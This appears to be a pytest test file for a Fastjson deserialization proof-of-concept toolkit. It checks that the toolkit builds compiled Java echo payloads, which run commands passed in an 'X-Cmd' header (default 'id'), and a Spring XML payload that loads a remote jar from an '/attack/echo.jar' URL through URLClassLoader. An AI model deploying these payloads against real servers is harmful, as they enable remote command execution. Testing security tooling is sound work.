"""回显模块轻量单测（需本机 javac）。"""

from __future__ import annotations

import base64

import pytest

from fastjson_toolkit.poc.echo import (
    ECHO_ENGINES,
    build_echo_artifact,
    build_spring_echo_xml,
    list_engines,
    normalize_engine,
    supports_1280_echo,
    supports_bytecode_echo,
)


def test_list_engines_covers_jeg():
    ids = {e["id"] for e in list_engines()}
    assert ids == set(ECHO_ENGINES)
    assert "jetty" in ids and "dfs" in ids and "httpserver" in ids


def test_normalize_engine_rejects_unknown():
    with pytest.raises(ValueError):
        normalize_engine("glassfish")


def test_supports_flags():
    assert supports_bytecode_echo("h2_jdbc")
    assert supports_1280_echo("groovy")
    assert not supports_bytecode_echo("c3p0_wrapper")


def test_build_echo_artifact_compiles():
    art = build_echo_artifact(engine="tomcat", cmd_header="X-Cmd", default_cmd="id")
    assert art.class_bytes.startswith(b"\xca\xfe\xba\xbe")
    assert art.bcel_code.startswith("$$BCEL$$")
    assert base64.b64decode(art.class_b64) == art.class_bytes


def test_spring_echo_xml_contains_loader():
    xml = build_spring_echo_xml(
        jar_url="http://127.0.0.1:18080/attack/echo.jar",
        class_name="EchoPayload",
    ).decode("utf-8")
    assert "URLClassLoader" in xml
    assert "EchoPayload" in xml
    assert "echo.jar" in xml
